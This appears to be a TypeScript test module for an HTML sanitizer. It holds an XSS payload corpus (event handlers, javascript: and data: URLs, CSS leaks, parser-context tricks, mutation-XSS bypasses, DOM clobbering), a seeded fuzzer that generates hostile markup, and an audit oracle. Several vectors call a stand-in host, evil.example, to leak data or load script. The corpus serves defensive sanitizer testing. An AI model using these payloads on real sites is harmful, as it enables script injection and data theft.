// XSS corpus and fuzzer of the AI block sanitizer (spec §6.2): the sanitizer's own tests run them, and so does the
// preview runtime's second wall (apps/preview) in a DOM. `@dialmade/ai-render/testing`, never imported by app code.
//
// Sources: the vectors of PortSwigger's XSS cheat sheet (event handlers on every kind of tag, protocols, encodings,
// SVG/MathML tricks, dangling markup, CSS), the mutation XSS (mXSS) cases that broke DOMPurify and other parse5-like
// sanitizers (namespace confusion, raw-text elements, comments, `<noscript>`, `<select>`/`<template>` parsing), plus
// Dialmade-specific ones (Tailwind arbitrary values, `#screen:` links, DOM clobbering of the island runtime).
import { ALLOWED_TAGS, INPUT_TYPES, isAllowedAttrFor } from "../allowlist";
import { prng } from "../direction";
import { PLACEHOLDER_KINDS } from "../sanitize";
import { HTML_NS, parseRaw, type RawNode } from "../tree";
import { checkClass } from "../vocabulary";

/** Event-handler vectors in the style of the cheat sheet: one per tag/event pair that fires without user help. */
const HANDLER_VECTORS = [
  "<img src=x onerror=alert(1)>",
  "<image src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<body onload=alert(1)>",
  "<body onpageshow=alert(1)>",
  "<frameset onload=alert(1)>",
  "<input autofocus onfocus=alert(1)>",
  "<select autofocus onfocus=alert(1)></select>",
  "<textarea autofocus onfocus=alert(1)></textarea>",
  "<keygen autofocus onfocus=alert(1)>",
  "<button autofocus onfocus=alert(1)>x</button>",
  "<a href=# autofocus onfocusin=alert(1)>x</a>",
  "<div tabindex=1 autofocus onfocus=alert(1)>x</div>",
  "<details open ontoggle=alert(1)>x</details>",
  "<div popover id=p onbeforetoggle=alert(1)>x</div><button popovertarget=p>go</button>",
  "<marquee onstart=alert(1)>x</marquee>",
  "<audio src=x onerror=alert(1)>",
  "<video src=x onerror=alert(1)></video>",
  "<video><source onerror=alert(1)></video>",
  "<object data=x onerror=alert(1)></object>",
  "<style onload=alert(1)></style>",
  "<link rel=stylesheet href=x onload=alert(1)>",
  "<iframe onload=alert(1)></iframe>",
  "<x onclick=alert(1)>custom element</x>",
  "<div onanimationstart=alert(1) style=\"animation-name:spin\">x</div>",
  "<div ontransitionend=alert(1) class=\"transition\">x</div>",
  "<div onpointerrawupdate=alert(1)>x</div>",
  "<div onmouseover=alert(1)>x</div>",
  "<div onwheel=alert(1)>x</div>",
  "<div oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>x</div>",
  "<p oncopy=alert(1) contenteditable>x</p>",
  "<dialog open onclose=alert(1)>x</dialog>",
  "<form onsubmit=alert(1)><button>x</button></form>",
  "<table background=javascript:alert(1)><tr><td>x</td></tr></table>",
  "<a href=x ONCLICK=alert(1)>case</a>",
  "<a href=x onclick\u000c=alert(1)>form feed</a>",
  "<a/onclick=alert(1)>slash</a>",
  "<img src=x onerror\n=alert(1)>",
  "<img/src=x/onerror=alert(1)>",
  "<img src=`x`onerror=alert(1)>",
  "<img \"\"\"><script>alert(1)</script>\">",
];

/** Dangerous URLs in every attribute that takes one. */
const PROTOCOL_VECTORS = [
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '<a href="&#0000106avascript:alert(1)">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="\u0001javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="//evil.example/">x</a>',
  '<a href="#screen:s-pricing" target="_top" ping="https://evil.example/p" download>x</a>',
  '<a href="#screen:s-pricing&quot; onclick=&quot;alert(1)">x</a>',
  '<a href="#screen:s-pricing javascript:alert(1)">x</a>',
  '<area href="javascript:alert(1)">',
  '<button formaction="javascript:alert(1)">x</button>',
  '<input type="image" formaction="javascript:alert(1)" src="x">',
  '<form action="javascript:alert(1)"><input type="submit"></form>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
  '<embed src="javascript:alert(1)">',
  '<object data="javascript:alert(1)"></object>',
  '<video poster="javascript:alert(1)"></video>',
  '<img srcset="https://evil.example/1x.png 1x">',
  '<img data-placeholder="photo" src="https://evil.example/t.png" alt="x">',
  '<img data-asset="logo" src="https://evil.example/logo.png">',
  '<input type="image" src="https://evil.example/x.png">',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<link rel="import" href="https://evil.example/x.html">',
  '<link rel="prefetch" href="https://evil.example/leak">',
  '<portal src="https://evil.example"></portal>',
  '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">x</text></a></svg>',
  '<svg><animate attributeName="href" values="javascript:alert(1)"/><a id="x"><text>x</text></a></svg>',
  '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>',
  '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=1 onerror=alert(1) /></svg>#x"></use></svg>',
  '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>',
  '<math href="javascript:alert(1)">x</math>',
];

/** CSS and class vectors: no `style`, no arbitrary Tailwind values, nothing that becomes `url()`. */
const CSS_VECTORS = [
  '<div style="background:url(https://evil.example/leak)">x</div>',
  '<div style="behavior:url(x.htc);-moz-binding:url(x.xml#x)">x</div>',
  '<style>@import url(https://evil.example/x.css)</style>',
  '<style>*{background:url(https://evil.example/leak)}</style>',
  '<div class="bg-[url(https://evil.example/leak)]">x</div>',
  '<div class="bg-(--x) [background:url(x)] [&_*]:hidden">x</div>',
  '<div class="text-[#ff0000] bg-red-500 text-white !p-4 dark:bg-black md:flex fixed sticky z-50 -mt-20">x</div>',
  '<div class="hover:[mask:url(x)] @[10px]:flex supports-[x]:block data-[x]:block">x</div>',
  '<div class="bg-primary&quot; onclick=&quot;alert(1)">x</div>',
  '<div class="content-[\'x\'] after:content-[url(x)] font-[x]">x</div>',
  '<div class="bg-\\[url(x)\\] url(x) bg-primary/[.5]">x</div>',
];

/** Raw-text, RCDATA and other parser contexts. */
const CONTEXT_VECTORS = [
  "<script>alert(1)</script>",
  "<script src=https://evil.example/x.js></script>",
  "<SCRIPT>alert(1)</SCRIPT>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<template><script>alert(1)</script></template>",
  "<template><img src=x onerror=alert(1)></template>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
  "<noembed><img title=\"</noembed><img src=x onerror=alert(1)>\"></noembed>",
  "<noframes><img title=\"</noframes><img src=x onerror=alert(1)>\"></noframes>",
  "<iframe><img title=\"</iframe><img src=x onerror=alert(1)>\"></iframe>",
  "<xmp><img src=x onerror=alert(1)></xmp>",
  "<plaintext><img src=x onerror=alert(1)>",
  "<title><img src=x onerror=alert(1)></title>",
  "<textarea></textarea><img src=x onerror=alert(1)></textarea>",
  "<textarea><img src=x onerror=alert(1)></textarea>",
  "<textarea>&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;</textarea>",
  "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
  "<pre>\n&lt;img src=x onerror=alert(1)&gt;</pre>",
  "<p>a<!-- <img src=x onerror=alert(1)> --></p>",
  "<!--><img src=x onerror=alert(1)>-->",
  "<!-- --!><img src=x onerror=alert(1)>-->",
  "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
  "<?xml-stylesheet href=x ?><img src=x onerror=alert(1)>",
  "<![CDATA[<img src=x onerror=alert(1)>]]>",
  "<svg><![CDATA[><img src=x onerror=alert(1)>]]></svg>",
  "<div><img src='https://evil.example/?leak=",
  "<a href='#'><img src=x onerror=alert(1)//",
  "<table><tr><td>a</td>text<img src=x onerror=alert(1)></tr></table>",
  "<select><option><img src=x onerror=alert(1)></option></select>",
  "<select><style><img src=x onerror=alert(1)></style></select>",
  "<select><template><style><!--</style><a rel=\"--></template></select><img src=x onerror=alert(1)>\">",
  "<isindex action=javascript:alert(1) type=image>",
];

/**
 * Mutation XSS (mXSS): markup that a sanitizer parses one way and the browser re-parses another after serialization.
 * Most broke DOMPurify at some point (namespace confusion through `<math>`/`<svg>`, `<style>` in foreign content,
 * nested forms, `<noscript>`), or parse5-based sanitizers that serialized raw text unescaped.
 */
const MXSS_VECTORS = [
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<svg><title><style><img src=x onerror=alert(1)></style></title></svg>',
  '<svg><desc><img src=x onerror=alert(1)></desc></svg>',
  '<svg><foreignObject><p><img src=x onerror=alert(1)></p></foreignObject></svg>',
  '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
  '<math><annotation-xml encoding="text/html"><style><img src=x onerror=alert(1)></style></annotation-xml></math>',
  '<table><td><form><svg><style></form><img src onerror=alert(1)>',
  '<svg><p><style><!--</style><img src onerror=alert(1)>-->',
  '<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>',
  '<a title="&lt;/a&gt;&lt;img src=x onerror=alert(1)&gt;">x</a>',
  '<p>&lt;img src=x onerror=alert(1)&gt;</p>',
  '<img data-placeholder="photo" alt="&quot; onerror=&quot;alert(1)">',
  '<img alt="`<img src=x onerror=alert(1)>`">',
  '<div id="x">&#x3C;img src=x onerror=alert(1)&#x3E;</div>',
  '<p>  <img src=x onerror=alert(1)></p>',
  '<p>\u0000<img src=x onerror=alert(1)></p>',
  '<svg><textarea></svg><img src=x onerror=alert(1)></textarea>',
  '<math><style><img src=x onerror=alert(1)></style></math>',
  '<xmp><p title="</xmp><img src=x onerror=alert(1)>"></xmp>',
  '<div><svg><foreignobject><p><style><img src=x onerror=alert(1)></style></p></foreignobject></svg></div>',
];

/** DOM clobbering of the island runtime and Dialmade-specific misuse. */
const DIALMADE_VECTORS = [
  '<div id="__proto__" name="location">x</div>',
  '<img name="importNode" alt="x"><img name="createElement"><img name="getElementById">',
  '<img id="defaultView" name="body"><input name="cookie">',
  '<a id="dl-island" href="#">x</a><div id="parent">x</div>',
  '<label for="dl-island">x</label><p aria-labelledby="dl-island body">x</p>',
  '<div data-block-id="other">nested root id</div>',
  '<div data-dl-t="999" data-dl-ai-block data-x="1">handles</div>',
  '<i data-icon="../../etc/passwd" class="size-4"></i><i data-icon="<script>"></i>',
  '<img data-placeholder="javascript:alert(1)" alt="x">',
  '<button type="submit" name="x" value="y" form="f">x</button>',
  '<input type="password" autocomplete="current-password" name="password">',
  '<div role="alertdialog" aria-live="assertive" tabindex="9">x</div>',
  '<time datetime="2026-10-10<script>">x</time>',
  '<td colspan="1000" rowspan="-1">x</td>',
  '<div aria-label="&lt;img src=x onerror=alert(1)&gt;" aria-describedby="x y z">x</div>',
  '<a href="#screen:s-pricing" onfocus=alert(1) autofocus>ok</a>',
];

export type XssCase = { group: "handlers" | "protocols" | "css" | "contexts" | "mxss" | "dialmade"; payload: string };

/** Every vector of the corpus with its group. */
export const XSS_CORPUS: readonly XssCase[] = [
  ...HANDLER_VECTORS.map((payload) => ({ group: "handlers" as const, payload })),
  ...PROTOCOL_VECTORS.map((payload) => ({ group: "protocols" as const, payload })),
  ...CSS_VECTORS.map((payload) => ({ group: "css" as const, payload })),
  ...CONTEXT_VECTORS.map((payload) => ({ group: "contexts" as const, payload })),
  ...MXSS_VECTORS.map((payload) => ({ group: "mxss" as const, payload })),
  ...DIALMADE_VECTORS.map((payload) => ({ group: "dialmade" as const, payload })),
];

// ── fuzzing ──────────────────────────────────────────────────────────────────────

const FUZZ_TAGS = [
  "section", "div", "p", "span", "a", "button", "img", "input", "textarea", "select", "option", "table", "tr", "td",
  "ul", "li", "h1", "h2", "i", "label", "script", "style", "svg", "math", "mtext", "mglyph", "foreignObject", "desc",
  "title", "template", "noscript", "iframe", "xmp", "noembed", "form", "object", "embed", "base", "meta", "link",
  "SCRIPT", "sVg", "image", "isindex", "keygen", "plaintext", "listing", "x-el", "frameset", "body", "head", "html",
];
const FUZZ_ATTRS = [
  "onerror", "onload", "onclick", "ONFOCUS", "onbeforetoggle", "href", "src", "srcset", "style", "class", "id", "name",
  "for", "type", "formaction", "action", "xlink:href", "srcdoc", "data-block-id", "data-icon", "data-placeholder",
  "data-asset", "data-dl-t", "alt", "aria-label", "aria-labelledby", "role", "tabindex", "autofocus", "value",
  "title", "popover", "target", "ping", "background", "poster",
];
const FUZZ_VALUES = [
  "alert(1)", "javascript:alert(1)", "JaVaScRiPt:alert(1)", "&#106;avascript:alert(1)", "java\tscript:x", "#screen:s-pricing",
  "#screen:nope", "#", "https://evil.example/x", "//evil.example", "data:text/html,<script>alert(1)</script>",
  "bg-primary p-4", "bg-[url(x)] text-white", "@container hover:bg-primary-hover", "x\" onerror=\"alert(1)",
  "</style><img src=x onerror=alert(1)>", "--><img src=x onerror=alert(1)>", "importNode", "dl-island", "-1", "9",
  "password", "image", "submit", "photo", "logo", "check", "&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;", "",
];
const FUZZ_TEXT = [
  "Hola", "<", ">", "&", "&lt;img src=x onerror=alert(1)&gt;", "&amp;lt;", "\u0000", " ", "‮", "{x}", "`",
  "<!--", "-->", "<![CDATA[", "]]>", "<?", "</", "\"'", "javascript:", "\n", " ",
];

/**
 * Random hostile HTML from a seeded PRNG: tags (allowed, forbidden and foreign), attributes and values from the
 * lists above, unclosed and misnested markup, comments and text with special characters. Deterministic per seed.
 */
export function fuzzHtml(seed: number, size = 24): string {
  const random = prng(seed);
  const pick = <T,>(items: readonly T[]): T => items[Math.floor(random() * items.length)]!;
  const quote = () => pick(['"', "'", ""]);
  let out = "";
  const open: string[] = [];
  for (let i = 0; i < size; i++) {
    const roll = random();
    if (roll < 0.45) {
      const tag = pick(FUZZ_TAGS);
      let attrs = "";
      const count = Math.floor(random() * 4);
      for (let a = 0; a < count; a++) {
        const q = quote();
        attrs += `${pick([" ", "/", "\n", "\t"])}${pick(FUZZ_ATTRS)}=${q}${pick(FUZZ_VALUES)}${q}`;
      }
      out += `<${tag}${attrs}${random() < 0.1 ? "/" : ""}>`;
      open.push(tag);
    } else if (roll < 0.65 && open.length > 0) {
      out += `</${random() < 0.8 ? open.pop() : pick(FUZZ_TAGS)}>`;
    } else if (roll < 0.72) {
      out += pick(["<!--", "-->", "<!-->", "--!>", "<![CDATA[", "]]>", "<?x ", "</", "<", "<a", "\"", "'", ">"]);
    } else {
      out += pick(FUZZ_TEXT);
    }
  }
  return out;
}

// ── oracle ───────────────────────────────────────────────────────────────────────

const ID_REFS = new Set(["id", "for", "aria-labelledby", "aria-describedby", "aria-controls"]);

/**
 * Independent check of sanitized HTML, parsed again like a browser would (parse5): every element of the HTML
 * namespace and the allowlist, every attribute allowed for its tag (never `on*`), links only `#` or
 * `#screen:<known id>`, every class in the vocabulary, safe `type`s, prefixed ids. Returns the violations.
 */
export function auditSanitized(html: string, screenIds: readonly string[] = []): string[] {
  const problems: string[] = [];
  const visit = (nodes: readonly RawNode[]) => {
    for (const node of nodes) {
      if (node.type === "text") continue;
      const where = `<${node.tag}>`;
      if (node.namespace !== HTML_NS) problems.push(`${where} in ${node.namespace}`);
      if (!ALLOWED_TAGS.has(node.tag)) problems.push(`${where} not allowed`);
      for (const [name, value] of node.attrs) {
        if (/^on/i.test(name)) problems.push(`${where} handler ${name}`);
        if (!isAllowedAttrFor(node.tag, name)) problems.push(`${where} attribute ${name}`);
        if (name === "href" && !(value === "#" || (/^#screen:([\w-]+)$/.test(value) && screenIds.includes(value.slice(8))))) problems.push(`${where} href ${value}`);
        if (name === "class") for (const token of value.split(/\s+/).filter(Boolean)) if (!checkClass(token).ok) problems.push(`${where} class ${token}`);
        if (name === "type" && node.tag === "input" && !INPUT_TYPES.has(value)) problems.push(`${where} type ${value}`);
        if (name === "type" && node.tag === "button" && value !== "button") problems.push(`${where} type ${value}`);
        if (name === "tabindex" && value !== "0" && value !== "-1") problems.push(`${where} tabindex ${value}`);
        if (name === "data-icon" && !/^[a-z0-9-]+$/.test(value)) problems.push(`${where} icon ${value}`);
        if (name === "data-placeholder" && !(PLACEHOLDER_KINDS as readonly string[]).includes(value)) problems.push(`${where} placeholder ${value}`);
        if (name === "data-asset" && value !== "logo") problems.push(`${where} asset ${value}`);
        if (ID_REFS.has(name) && value.split(/\s+/).some((ref) => !ref.startsWith("ai-"))) problems.push(`${where} unprefixed ${name}=${value}`);
      }
      visit(node.children);
    }
  };
  // Text stays text (it is escaped), so what a browser builds from `html` is the whole story: no raw-string checks.
  visit(parseRaw(html).nodes);
  return problems;
}
